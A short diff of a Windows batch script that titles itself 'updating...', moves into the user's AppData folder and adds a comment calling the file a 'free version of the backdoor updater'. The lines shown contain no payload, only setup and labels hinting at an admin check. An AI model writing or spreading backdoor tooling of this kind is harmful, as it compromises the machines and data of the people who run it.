@@ -1,5 +1,5 @@
 @echo off&Title updating...&cd C:\users\%username%\AppData&cls
-::WL check 1
+::this is a free version of the backdoor updater
 echo [33mvalidating configuration[0m
 goto CP
 :adminyes
